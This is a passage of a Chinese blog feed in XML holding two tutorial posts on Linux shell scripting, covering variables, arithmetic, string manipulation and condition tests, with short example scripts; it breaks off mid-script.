alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141535201.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141550200.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141603805.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141621700.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="2020101014164097.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141651804.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141707114.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="image-20211009132110430.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><p><img "" class="lazyload placeholder" data-original="image-20211009132042277.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009132042277"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell基础</title>
      <link href="/2021/09/14/Linux%20Shell/Linux%20Shell%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/09/14/Linux%20Shell/Linux%20Shell%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="1-shell基础"><a class="markdownIt-Anchor" href="#1-shell基础">#</a> 1 Shell 基础</h2><p>什么是 shell？目前常用的操作系统（Windows、U/L、Android、iOS 等）都带有图形界面，然 而，早期的计算机并没有图形界面，人们只能使用命令来控制计算机。其实，真 正能够控制计算机硬件（CPU、内存、显示器）的只有操作系统内核（Kernel）， 图形界面和命令行都是架设在用户和内核之间的桥梁，是为了方便用户控制计算 机而存在的。Shell 也是一种编程语言，主要用来开发一些实用的、自动化的小工具，例如，检测计算机的硬件参数、搭建 Web 运行环境、日志分析等。对 Linux 运维工程师来说，Shell 更是必须掌握的技能。Shell 使自动化管理服务器集群成为可能，否则用户只能一个一个地登录所有的服务器，对每一台服务器进行相同的设置，而这些服务器可能有成百上千之多，用户会在重复性的工作上浪费大量时间。</p><h3 id="11查看shell版本"><a class="markdownIt-Anchor" href="#11查看shell版本">#</a> 1.1 查看 Shell 版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/sbin/nologin</span><br><span class="line">/usr/bin/sh</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><h3 id="12-shell变量类型"><a class="markdownIt-Anchor" href="#12-shell变量类型">#</a> 1.2 Shell 变量类型</h3><p>Shell 变量分为四类，分别为自定义变量、环境变量、位置变量和预定义变量。</p><ul><li>根据工作要求临时定义的变量称为自定义变量</li><li>环境变量一般是指用 export 内置命令导出的变量，用于定义 Shell 的运行环境，保证 Shell 命令的正确执行 只使用 不定义</li><li>从命令行、函数或脚本执行等处传递参数时，$0、$1 称为特殊位置变量</li><li>预定义变量是在 bash 中已有的变量，可以直接使用，如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi><mtext>、</mtext></mrow><annotation encoding="application/x-tex">@、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">@</span><span class="mord cjk_fallback">、</span></span></span></span>* 等。</li></ul><h4 id="121-自定义变量"><a class="markdownIt-Anchor" href="#121-自定义变量">#</a> 1.2.1 自定义变量</h4><p>自定义变量可以理解为局部变量或普通变量，只能在创建它们的 Shell 函数或 Shell 脚本中使用，自定义变量的说明如表所示。</p><table><thead><tr><th>定义自定义变量</th><th>变量名 = 变量值，字母下划线开头，区分大小写</th></tr></thead><tbody><tr><td>使用自定义变量</td><td>$ 变量名</td></tr><tr><td>查看自定义变量</td><td>echo$ 变量名 set (所有变量)</td></tr><tr><td>取消自定义变量</td><td>unset 变量名</td></tr><tr><td>自定义变量使用范围</td><td>仅在当前 Shell 中有效</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">分支结构</span></span><br><span class="line">host=www.baidu.com</span><br><span class="line">if ping -c1 $host &amp;&gt;/dev/null</span><br><span class="line">then</span><br><span class="line">echo &quot;network ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="122环境变量"><a class="markdownIt-Anchor" href="#122环境变量">#</a> 1.2.2 环境变量</h4><p>环境变量也可称为全局变量，可以在创建它们的 Shell 及其派生出来的任意子进程 Shell 中使用。环境变量的说明如表所示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看</span></span><br><span class="line">echo $PATH</span><br><span class="line"><span class="meta">#</span><span class="bash">修改</span></span><br><span class="line">PATH=$PATH:/bin/new</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><h4 id="123位置变量"><a class="markdownIt-Anchor" href="#123位置变量">#</a> 1.2.3 位置变量</h4><p>在 Shell 中存在一些位置变量。位置变量用于在命令行、函数或脚本中传递参数，其变量名不用自己定义，其作用也是固定的。执行脚本时，通过在脚本后面给出具体的参数（多个参数用空格隔开）对相应的位置变量进行赋值。<br>$0 代表命令本身，$1-$9 代表接收的第 1~9 个参数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mtext>以上需要用</mtext><mrow></mrow><mtext>括起来，如</mtext></mrow><annotation encoding="application/x-tex">10以上需要用{}括起来，如</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">用</span><span class="mord"></span><span class="mord cjk_fallback">括</span><span class="mord cjk_fallback">起</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span></span></span></span> {10} 代表接收的第 10 个参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ cat ping06.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">ping -c1 $1 &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">if [ $? -eq &quot;0&quot; ];then</span><br><span class="line">echo &quot;network to $1 is ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network to $1&quot;</span><br><span class="line">fi</span><br><span class="line">[hadoop@master shell]$ sh ping06.sh www.baidu.com</span><br><span class="line">network to www.baidu.com is ok</span><br></pre></td></tr></table></figure><h4 id="124预定义变量"><a class="markdownIt-Anchor" href="#124预定义变量">#</a> 1.2.4 预定义变量</h4><table><thead><tr><th>$0</th><th>脚本名</th></tr></thead><tbody><tr><td>$*</td><td>所有参数</td></tr><tr><td>$@</td><td>所有参数</td></tr><tr><td>$#</td><td>参数的个数</td></tr><tr><td>$$</td><td>当前进程 PID</td></tr><tr><td>$!</td><td>上一个进程 PID</td></tr><tr><td>$?</td><td>上一个命令返回值，0 代表成功</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ ls &amp;</span><br><span class="line">[1] 6950</span><br><span class="line">[hadoop@master shell]$ ip.txt  ping03.sh  ping04.sh  ping05.sh  ping06.sh  ping07.sh  read</span><br><span class="line"></span><br><span class="line">[1]+  完成                  ls --color=auto</span><br><span class="line">[hadoop@master shell]$ $!</span><br><span class="line">-bash: 6950: 未找到命令</span><br><span class="line"></span><br><span class="line">[hadoop@master shell]$ cat ping07.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ $# -eq 0 ];then</span><br><span class="line">echo &quot;usage: `basename $0` filename&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f $1 ];then</span><br><span class="line">echo &quot;filename error&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">for ip in `cat $1`</span><br><span class="line">do </span><br><span class="line">ping -c1 $ip</span><br><span class="line">done</span><br><span class="line">[hadoop@master shell]$ sh ping07.sh </span><br><span class="line">usage: ping07.sh filename</span><br><span class="line">[hadoop@master shell]$ sh ping07.sh ip.txt </span><br></pre></td></tr></table></figure><h3 id="13变量的赋值"><a class="markdownIt-Anchor" href="#13变量的赋值">#</a> 1.3 变量的赋值</h3><h4 id="131显式赋值"><a class="markdownIt-Anchor" href="#131显式赋值">#</a> 1.3.1 显式赋值</h4><p>在 Shell 中，当第一次使用某变量名时，实际上就已经给变量赋值了。显式赋值的<br>格式为” 变量名 = 变量值”。为了避免歧义，显式赋值时__禁止在等号两边添加空格__，<br>这跟常见的编程语言有所不同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br></pre></td></tr></table></figure><ul><li>变量缺省为字符串类型</li><li>变量值中有空格需要使用引号</li><li>使用变量值进行赋值  name=“welcome to $place”</li></ul><h4 id="132从键盘赋值"><a class="markdownIt-Anchor" href="#132从键盘赋值">#</a> 1.3.2 从键盘赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read -p &quot;Please enter a ip:&quot; ip</span><br><span class="line">Please enter a ip:1.1.1.1</span><br><span class="line">echo $ip</span><br><span class="line">1.1.1.1</span><br></pre></td></tr></table></figure><h4 id="133使用位置变量赋值"><a class="markdownIt-Anchor" href="#133使用位置变量赋值">#</a> 1.3.3 使用位置变量赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat test.sh</span><br><span class="line">echo $1 $2</span><br><span class="line">sh test.sh hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h4 id="134利用命令替换进行赋值"><a class="markdownIt-Anchor" href="#134利用命令替换进行赋值">#</a> 1.3.4 利用命令替换进行赋值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">today=`date +%F`</span><br><span class="line">echo today</span><br><span class="line">2021-10-2</span><br><span class="line">touch `date +%F`_file.txt</span><br></pre></td></tr></table></figure><p>双引号弱引用，单引号为强引用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hadoop@master shell]$ cat ping04.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">host=www.baidu.com</span><br><span class="line">ping -c1 $host &amp;&gt;/dev/null</span><br><span class="line">if [ $? -eq 0 ] </span><br><span class="line">then</span><br><span class="line">echo &quot;network to $host is ok&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;bad network to $host&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="14变量的运算"><a class="markdownIt-Anchor" href="#14变量的运算">#</a> 1.4 变量的运算</h3><h4 id="141expr数值运算命令"><a class="markdownIt-Anchor" href="#141expr数值运算命令">#</a> 1.4.1.expr 数值运算命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo 1 + 3</span><br><span class="line">1 + 3</span><br><span class="line">expr 1 + 3</span><br><span class="line">4</span><br><span class="line">res = `expr $name1 \* $name2`</span><br><span class="line">echo $res</span><br></pre></td></tr></table></figure><ul><li>在使用 expr 时，需要注意运算符及用于计算的数字两边必须有空格，否则会执行失败。</li><li>expr 支持乘法运算，在使用乘号 * 时必须用反斜杠转义，即 \*</li></ul><h4 id="142或数值运算命令"><a class="markdownIt-Anchor" href="#142或数值运算命令">#</a> 1.4.2.“$(())” 或 “[]” 数值运算命令</h4><ul><li>双小括号 “$(())” 的作用是进行整数运算和数值比较，格式为 “ ((表达式))”</li><li>操作数、运算符两侧可以有空格</li><li>括号内 $ 符合可省略</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num1=10</span><br><span class="line">num2=20</span><br><span class="line">sum=$((num1+num2))</span><br><span class="line">echo $sum</span><br><span class="line">30</span><br><span class="line">sum=$[ num1+num2 ]</span><br><span class="line">echo $sum</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用加减乘除幂</span></span><br></pre></td></tr></table></figure><h4 id="143let数值运算命令"><a class="markdownIt-Anchor" href="#143let数值运算命令">#</a> 1.4.3.let 数值运算命令</h4><ul><li>let 数值符号可以直接进行计算，不需要使用 $ 符号。</li><li>let 运算命令的语法格式为：let 赋值表达式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let num=1+2</span><br><span class="line">echo $num</span><br><span class="line">3</span><br><span class="line"><span class="meta">#</span><span class="bash">调试模式</span></span><br><span class="line">bash -vx test.sh</span><br></pre></td></tr></table></figure><h4 id="144shell小数运算"><a class="markdownIt-Anchor" href="#144shell小数运算">#</a> 1.4.4Shell 小数运算</h4><ul><li>bc 是 Unix/Linux 下的计算器，它还可以作为命令进行小数运算。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;2^4&quot;|bc</span><br><span class="line">16</span><br><span class="line">echo &quot;scale=2;6/4&quot;|bc</span><br><span class="line">1.50</span><br></pre></td></tr></table></figure><h3 id="15-变量的删除和替换"><a class="markdownIt-Anchor" href="#15-变量的删除和替换">#</a> 1.5 变量的删除和替换</h3><p>Linux 提供了一些可以直接对变量进行操作的符号。通过这些符号，变量中的部分内容可以被删除、替换和替代。在 Shell 变量中，变量的删除、替换和替代也是非常重要的。通过简单的操作修改变量，可以减少代码的行数并提高可读性。</p><h4 id="151-变量的删除"><a class="markdownIt-Anchor" href="#151-变量的删除">#</a> 1.5.1 变量的删除</h4><ul><li>变量删除的操作方式，如表所示。</li></ul><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td 变量名#关键字符="">$</td><td>如果变量内容从头开始的数据符合 “关键字符”，则将符合的最短数据删除</td></tr><tr><td 变量名##关键字符="">$</td><td>如果变量内容从头开始的数据符合 “关键字符”，则将符合的最长数据删除</td></tr><tr><td 变量名%关键字符="">$</td><td>如果变量内容从尾开始的数据符合 “关键字符”，则将符合的最短数据删除</td></tr><tr><td 变量名%%关键字符="">$</td><td>如果变量内容从尾开始的数据符合 “关键字符”，则将符合的最长数据删除</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 ~]# url=www.bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url&#125;</span><br><span class="line">www.bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;#url&#125;</span><br><span class="line">12</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url&#125;</span><br><span class="line">www.bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url#*.&#125;</span><br><span class="line">bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url##*.&#125;</span><br><span class="line">com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url%.*&#125;</span><br><span class="line">www.bing</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url%%.*&#125;</span><br></pre></td></tr></table></figure><ul><li>索引和切片</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 ~]# echo $&#123;url:0:5&#125;</span><br><span class="line">www.b</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url:5:5&#125;</span><br><span class="line">ing.c</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url:5:&#125;</span><br><span class="line"></span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url:5&#125;</span><br><span class="line">ing.com</span><br></pre></td></tr></table></figure><h4 id="152-变量的替换"><a class="markdownIt-Anchor" href="#152-变量的替换">#</a> 1.5.2 变量的替换</h4><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td 变量名旧字符串新字符串="">$</td><td>表示若变量内容符和【旧字符串】则第一个【旧字符串】会被【新字符串】替换</td></tr><tr><td 变量名旧字符串新字符串="">$</td><td>表示若变量内容符和【旧字符串】则全部的【旧字符串】会被【新字符串】替换</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 ~]# echo $&#123;url/bing/baidu&#125;</span><br><span class="line">www.baidu.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url/b/B&#125;</span><br><span class="line">www.Bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url/w/W&#125;</span><br><span class="line">Www.bing.com</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url//w/W&#125;</span><br><span class="line">WWW.bing.com</span><br></pre></td></tr></table></figure><h4 id="153变量的替代"><a class="markdownIt-Anchor" href="#153变量的替代">#</a> 1.5.3 变量的替代</h4><ul><li>给 Shell 变量设置默认值的格式为”${变量名 - 新的变量名}”，如果变量名没有被赋值，会使用” 新的变量值” 替代，如果变量已被赋值（包括空值），则该值不会被替代。</li><li>变量替代常用于为变量设置缺省值。例如，在连接数据库时，需要使用端口，这个端口可以是预先设置的具体端口，也可以是用户输入的端口。假如用户没有输入具体的端口号，脚本中就使用预先设置的端口。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 ~]# unset url</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url&#125;</span><br><span class="line"></span><br><span class="line">[root@hdp-1 ~]# echo $&#123;url-www.heuet.edu.cn&#125;</span><br><span class="line">www.heuet.edu.cn</span><br><span class="line"></span><br><span class="line">[root@hdp-1 ~]# host=hadoop</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;host-www.heuet.edu.cn&#125;</span><br><span class="line">hadoop</span><br><span class="line">[root@hdp-1 ~]# var=</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;var-www.heuet.edu.cn&#125;</span><br><span class="line"></span><br><span class="line">[root@hdp-1 ~]# unset var1</span><br><span class="line">[root@hdp-1 ~]# var2=</span><br><span class="line">[root@hdp-1 ~]# var3=333</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;var1-111&#125;</span><br><span class="line">111</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;var1:-111&#125;</span><br><span class="line">111</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;var2:-111&#125;</span><br><span class="line">111</span><br><span class="line">[root@hdp-1 ~]# echo $&#123;var3:-111&#125;</span><br><span class="line">333</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell条件测试</title>
      <link href="/2021/09/14/Linux%20Shell/Linux%20Shell%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/09/14/Linux%20Shell/Linux%20Shell%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="2-shell条件测试"><a class="markdownIt-Anchor" href="#2-shell条件测试">#</a> 2 Shell 条件测试</h2><h3 id="21-文件测试"><a class="markdownIt-Anchor" href="#21-文件测试">#</a> 2.1 文件测试</h3><ul><li>在 Shell 编程中，通常使用 test 命令进行条件测试</li><li>语法形式为 “test &lt; 测试表达式&gt;”。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 ~]# test -d /home</span><br><span class="line">[root@hdp-1 ~]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 ~]# test -d /homo</span><br><span class="line">[root@hdp-1 ~]# echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>test 条件测试在脚本中的应用</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat test_mysqlback.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line">back_dir=~/mysql_back</span><br><span class="line">if ! test -d $back_dir;then</span><br><span class="line">mkdir -p $back_dir</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;开始备份...&quot;</span><br><span class="line">[root@hdp-1 shell]# chmod +x test_mysqlback.sh </span><br><span class="line">[root@hdp-1 shell]# bash -vx test_mysqlback.sh </span><br></pre></td></tr></table></figure><ul><li>除 test 外，还可以使用中括号或双中括号进行条件测试</li><li>中括号 [ 是 Shell 的内置命令，不是标点符号</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# [ -d /home ]</span><br><span class="line">[root@hdp-1 shell]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -d /homo ]</span><br><span class="line">[root@hdp-1 shell]# echo $?</span><br><span class="line">1</span><br><span class="line">[root@hdp-1 shell]# type -a [</span><br><span class="line">[ 是 shell 内嵌</span><br><span class="line">[ 是 /usr/bin/[</span><br><span class="line">[root@hdp-1 shell]# [[ -d /home ]];echo $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure><ul><li>文件测试操作符</li></ul><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>-d</td><td>测试是否为目录 (Directory)</td></tr><tr><td>-a</td><td>测试目录或文件是否存在 (Exist）</td></tr><tr><td>-f</td><td>测试是否为文件 (File)</td></tr><tr><td>-r</td><td>测试当前用户是否可读（read)</td></tr><tr><td>-w</td><td>测试当前用户是否可写 (write）</td></tr><tr><td>-x</td><td>测试当前用户是否可执行（cxcutc）</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# ll host.txt </span><br><span class="line">-rw-r--r--. 1 root root 102 11月  2 15:41 host.txt</span><br><span class="line">[root@hdp-1 shell]# [ -r host.txt ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# chmod -r host.txt </span><br><span class="line">[root@hdp-1 shell]# ll host.txt </span><br><span class="line">--w-------. 1 root root 102 11月  2 15:41 host.txt</span><br><span class="line">[root@hdp-1 shell]# [ -r host.txt ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -w host.txt ];echo $?</span><br><span class="line">0</span><br><span class="line">[root@hdp-1 shell]# [ -x host.txt ];echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="22-整数测试"><a class="markdownIt-Anchor" href="#22-整数测试">#</a> 2.2 整数测试</h3><ul><li>整数测试通常用于数值之间的运算，其语法格式为 [整数 1 操作符 整数 2]</li><li>或 test 整数 1 操作符 整数 2。</li></ul><table><thead><tr><th>操作符</th><th>含义</th></tr></thead><tbody><tr><td>-eq</td><td>等于（Equal）</td></tr><tr><td>-ne</td><td>不等于 (Not Equal)</td></tr><tr><td>-gt</td><td>大于 (Greater Than)</td></tr><tr><td>-lt</td><td>小于 (Lesser Than)</td></tr><tr><td>-le</td><td>小于或等于 (Lesser or Equal)</td></tr><tr><td>-ge</td><td>大于或等于 (Greater or Equal)</td></tr></tbody></table><ul><li>整数测试在脚本中的应用：创建新用户</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 shell]# cat create_user01.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read 